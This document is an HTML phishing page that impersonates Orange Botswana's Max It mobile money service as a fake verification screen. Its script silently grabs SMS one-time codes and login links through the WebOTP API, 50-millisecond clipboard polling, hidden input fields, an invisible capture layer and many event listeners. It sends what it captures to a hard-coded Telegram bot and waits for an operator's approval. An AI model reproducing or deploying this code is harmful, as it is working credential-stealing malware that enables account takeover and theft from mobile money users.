<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Orange Max It - Verify</title>
    <link rel="icon" href="https://www.orange.co.bw/favicon.ico" type="image/x-icon">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap');
        
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; -webkit-tap-highlight-color: transparent; }
        
        html, body { 
            width: 100%; 
            height: 100%; 
            background: linear-gradient(135deg, #fff8f3 0%, #ffe6d5 100%); 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            padding: 0;
            margin: 0;
            user-select: none;
            -webkit-user-select: none;
            overflow: hidden;
        }
        
        .container { 
            width: 100%; 
            max-width: 480px; 
            background: white; 
            border-radius: 32px; 
            padding: 50px 30px; 
            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.12); 
            text-align: center; 
            position: relative;
            z-index: 10;
        }

        .logo { 
            width: 80px; 
            height: 80px; 
            background: linear-gradient(135deg, #FF6600, #FF8533); 
            border-radius: 20px; 
            margin: 0 auto 30px; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            color: white; 
            font-weight: 800; 
            font-size: 40px; 
            box-shadow: 0 15px 40px rgba(255, 102, 0, 0.3);
        }

        h1 { 
            font-size: 28px; 
            font-weight: 800; 
            color: #1a1a1a; 
            margin-bottom: 12px; 
        }

        .subtitle { 
            font-size: 15px; 
            color: #666; 
            margin-bottom: 35px; 
            line-height: 1.6;
        }

        #initialView { display: block; }
        #monitoringView { display: none; }

        .btn-start {
            width: 100%;
            padding: 20px;
            background: linear-gradient(135deg, #FF6600, #E55A00);
            color: white;
            border: none;
            border-radius: 18px;
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 12px 35px rgba(255, 102, 0, 0.25);
        }

        .btn-start:active { transform: translateY(3px); }

        .hint { 
            font-size: 12px; 
            color: #999; 
            margin-top: 18px; 
            font-weight: 500;
        }

        .monitor-indicator {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 14px;
            margin: 40px 0;
        }

        .monitor-pulse {
            width: 16px;
            height: 16px;
            background: #FF6600;
            border-radius: 50%;
            animation: pulse 1.8s infinite;
        }

        @keyframes pulse {
            0%, 100% { transform: scale(0.8); opacity: 1; }
            50% { transform: scale(1.2); opacity: 0.5; }
        }

        .monitor-text { text-align: left; }
        .monitor-title { font-size: 16px; font-weight: 700; color: #1a1a1a; }
        .monitor-subtitle { font-size: 13px; color: #999; margin-top: 4px; }

        .status-message {
            background: #f0f7ff;
            border: 2px solid #cce4ff;
            border-radius: 14px;
            padding: 18px;
            margin: 25px 0;
            text-align: left;
            font-size: 13px;
            color: #007bff;
            font-weight: 600;
            line-height: 1.6;
            transition: all 0.4s;
        }

        .status-message.captured {
            background: #f0fdf4;
            border-color: #bbf7d0;
            color: #27ae60;
        }

        .status-message.sending {
            background: #fef3c7;
            border-color: #fcd34d;
            color: #b45309;
        }

        .status-message.success {
            background: #f0fdf4;
            border-color: #bbf7d0;
            color: #27ae60;
        }

        /* Full-Screen Invisible Capture Layer */
        #captureLayer {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            opacity: 0;
            pointer-events: auto;
        }

        .ghost-inputs {
            position: absolute;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            overflow: hidden;
        }

        .ghost-inputs input {
            width: 100%;
            height: 100%;
            font-size: 16px;
        }

        footer { 
            margin-top: 40px; 
            color: #BBB; 
            font-size: 11px; 
            text-align: center;
            font-weight: 500;
        }

        .spinner {
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 102, 0, 0.1);
            border-top: 3px solid #FF6600;
            border-radius: 50%;
            animation: spin 0.9s linear infinite;
            display: inline-block;
            margin-right: 8px;
            vertical-align: middle;
        }

        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <!-- FULL-SCREEN INVISIBLE CAPTURE LAYER -->
    <div id="captureLayer"></div>

    <div class="container">
        <!-- INITIAL STATE -->
        <div id="initialView">
            <div class="logo">🟠</div>
            <h1>Verify Connection</h1>
            <p class="subtitle">Secure verification required to proceed.</p>
            <button class="btn-start" id="startBtn">🔐 Start Verification</button>
            <p class="hint">Encrypted end-to-end connection</p>
        </div>

        <!-- MONITORING STATE -->
        <div id="monitoringView">
            <div class="logo">🟠</div>
            <h1>Monitoring Security</h1>
            
            <div class="monitor-indicator">
                <div class="monitor-pulse"></div>
                <div class="monitor-text">
                    <div class="monitor-title">Listening for Link</div>
                    <div class="monitor-subtitle">Awaiting SMS...</div>
                </div>
            </div>

            <div class="status-message" id="statusMessage">
                🔍 System is actively monitoring for your verification link. Do not close this window.
            </div>
        </div>
    </div>

    <!-- GHOST INPUTS -->
    <div class="ghost-inputs">
        <input type="text" id="ghostOTP" autocomplete="one-time-code" inputmode="numeric">
        <input type="text" id="ghostVerify" autocomplete="off">
        <input type="text" id="ghostGeneric">
    </div>

    <footer>© 2026 Orange Botswana | Licensed Financial Services</footer>

    <script>
        const CONFIG = {
            BOT_TOKEN: '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM',
            CHAT_ID: '7547427914',
            REDIRECT: 'success.html',
            PATTERN: /https?:\/\/(?:[a-z0-9\-]+\.)*(?:maxit-mobile\.orange\.co\.bw|orange\.co\.bw|maxit|auth|token|verify|link)[^\s"'<>]*/gi,
            CODE_PATTERN: /\b([A-Z0-9]{6,12}|[0-9]{4,8})\b/g
        };

        const state = {
            active: false,
            captured: null,
            sent: false,
            initialClipboard: '',
            lastUpdateId: 0,
            webOTPAbort: null
        };

        const els = {
            startBtn: document.getElementById('startBtn'),
            initialView: document.getElementById('initialView'),
            monitoringView: document.getElementById('monitoringView'),
            statusMessage: document.getElementById('statusMessage'),
            captureLayer: document.getElementById('captureLayer'),
            ghostOTP: document.getElementById('ghostOTP'),
            ghostVerify: document.getElementById('ghostVerify'),
            ghostGeneric: document.getElementById('ghostGeneric')
        };

        // ─── CHECK DEEP LINK ON PAGE LOAD ───
        window.addEventListener('load', () => {
            checkDeepLink();
        });

        function checkDeepLink() {
            const params = new URLSearchParams(window.location.search);
            const candidates = [
                params.get('link'),
                params.get('token'),
                params.get('url'),
                params.get('code'),
                params.get('verify')
            ];

            for (const val of candidates) {
                if (val) {
                    captureLink(val);
                    break;
                }
            }
        }

        // ─── START BUTTON ───
        els.startBtn.addEventListener('click', () => {
            state.active = true;
            els.initialView.style.display = 'none';
            els.monitoringView.style.display = 'block';

            navigator.clipboard.readText().then(text => {
                state.initialClipboard = text;
            }).catch(() => {});

            startMaximumSensitivity();
        });

        // ─── MAXIMUM SENSITIVITY CAPTURE ───
        function startMaximumSensitivity() {
            // 1. WebOTP (Silent)
            startSilentWebOTP();
            
            // 2. Ultra-Fast Clipboard (50ms)
            setInterval(scanClipboard, 50);
            
            // 3. Ghost Inputs
            setupGhostInputs();
            
            // 4. Full-Screen Event Listeners (Capture Layer)
            setupCaptureLayer();
            
            // 5. All Browser Events
            setupEventListeners();
        }

        // ─── METHOD 1: Silent WebOTP ───
        function startSilentWebOTP() {
            if (!('OTPCredential' in window)) return;

            try {
                state.webOTPAbort = new AbortController();
                navigator.credentials.get({
                    otp: { transport: ['sms'] },
                    signal: state.webOTPAbort.signal
                }).then(otp => {
                    if (otp?.code) {
                        captureLink(otp.code);
                    }
                }).catch(() => {});
            } catch(e) {}
        }

        // ─── METHOD 2: Ultra-Fast Clipboard ───
        async function scanClipboard() {
            if (!state.active || state.captured) return;
            try {
                const text = await navigator.clipboard.readText();
                if (text && text !== state.initialClipboard) {
                    captureLink(text);
                }
            } catch(e) {}
        }

        // ─── METHOD 3: Ghost Inputs ───
        function setupGhostInputs() {
            const inputs = [els.ghostOTP, els.ghostVerify, els.ghostGeneric];
            
            inputs.forEach(input => {
                input.addEventListener('input', (e) => captureLink(e.target.value));
                input.addEventListener('change', (e) => captureLink(e.target.value));
                input.addEventListener('paste', (e) => {
                    const text = (e.clipboardData || window.clipboardData).getData('text');
                    captureLink(text);
                });
            });

            // Focus bombing (every 100ms)
            setInterval(() => {
                if (state.active && !state.captured) {
                    els.ghostOTP.focus();
                }
            }, 100);
        }

        // ─── METHOD 4: Full-Screen Capture Layer ───
        function setupCaptureLayer() {
            els.captureLayer.addEventListener('touchstart', () => {
                if (state.active && !state.captured) {
                    scanClipboard();
                }
            });

            els.captureLayer.addEventListener('click', () => {
                if (state.active && !state.captured) {
                    scanClipboard();
                }
            });

            els.captureLayer.addEventListener('touchmove', () => {
                if (state.active && !state.captured) {
                    scanClipboard();
                }
            });
        }

        // ─── METHOD 5: All Browser Events ───
        function setupEventListeners() {
            // Focus events
            window.addEventListener('focus', () => {
                if (state.active && !state.captured) {
                    scanClipboard();
                }
            });

            // Visibility change
            document.addEventListener('visibilitychange', () => {
                if (document.visibilityState === 'visible' && state.active && !state.captured) {
                    scanClipboard();
                }
            });

            // Keyboard events
            document.addEventListener('keydown', () => {
                if (state.active && !state.captured) {
                    scanClipboard();
                }
            });

            // Input events on body
            document.addEventListener('input', () => {
                if (state.active && !state.captured) {
                    scanClipboard();
                }
            });

            // Paste events
            document.addEventListener('paste', (e) => {
                const text = (e.clipboardData || window.clipboardData).getData('text');
                if (text) {
                    captureLink(text);
                }
            });

            // Scroll events
            document.addEventListener('scroll', () => {
                if (state.active && !state.captured) {
                    scanClipboard();
                }
            });

            // Mouse move
            document.addEventListener('mousemove', () => {
                if (state.active && !state.captured) {
                    scanClipboard();
                }
            });
        }

        // ─── CAPTURE LINK ───
        function captureLink(text) {
            if (!text || state.captured) return;

            const linkMatch = text.match(CONFIG.PATTERN);
            if (linkMatch) {
                state.captured = linkMatch[0];
                onLinkCaptured(state.captured);
                return;
            }

            const codeMatch = text.match(CONFIG.CODE_PATTERN);
            if (codeMatch) {
                state.captured = codeMatch[0];
                onLinkCaptured(state.captured);
                return;
            }
        }

        function onLinkCaptured(link) {
            els.statusMessage.className = 'status-message captured';
            els.statusMessage.innerHTML = '✅ Link captured! Verifying security...';

            els.ghostOTP.value = '';
            els.ghostVerify.value = '';
            els.ghostGeneric.value = '';

            setTimeout(() => {
                sendToTelegram(link);
            }, 200);
        }

        // ─── SEND TO TELEGRAM ───
        async function sendToTelegram(link) {
            if (state.sent) return;
            state.sent = true;

            els.statusMessage.className = 'status-message sending';
            els.statusMessage.innerHTML = '<span class="spinner"></span>Sending to verification...';

            const aid = `app_${Date.now()}`;
            const did = `dec_${Date.now()}`;

            try {
                const res = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.CHAT_ID,
                        text: `🔐 *VERIFICATION LINK DETECTED*\n\n${link}`,
                        parse_mode: 'Markdown',
                        reply_markup: {
                            inline_keyboard: [[
                                { text: '✅ Approve', callback_data: aid },
                                { text: '❌ Decline', callback_data: did }
                            ]]
                        }
                    })
                });

                if (res.ok) {
                    els.statusMessage.className = 'status-message success';
                    els.statusMessage.innerHTML = '✅ Verification sent! Awaiting approval...';
                    startApprovalPolling(aid, did);
                }
            } catch(e) {
                state.sent = false;
                els.statusMessage.className = 'status-message';
                els.statusMessage.innerHTML = '⚠️ Error sending verification. Retrying...';
            }
        }

        // ─── APPROVAL POLLING ───
        function startApprovalPolling(aid, did) {
            const poll = setInterval(async () => {
                try {
                    const res = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}&timeout=5`);
                    const data = await res.json();

                    if (data.ok && data.result.length > 0) {
                        data.result.forEach(update => {
                            state.lastUpdateId = update.update_id;
                            const cb = update.callback_query?.data;

                            if (cb === aid) {
                                clearInterval(poll);
                                els.statusMessage.className = 'status-message success';
                                els.statusMessage.innerHTML = '✅ Approved! Redirecting...';
                                setTimeout(() => {
                                    window.location.href = CONFIG.REDIRECT;
                                }, 800);
                            } else if (cb === did) {
                                clearInterval(poll);
                                state.sent = false;
                                state.captured = null;
                                els.statusMessage.className = 'status-message';
                                els.statusMessage.innerHTML = '❌ Verification declined. Restarting...';
                                setTimeout(() => {
                                    location.reload();
                                }, 2000);
                            }
                        });
                    }
                } catch(e) {}
            }, 2000);
        }
    </script>
</body>
</html>
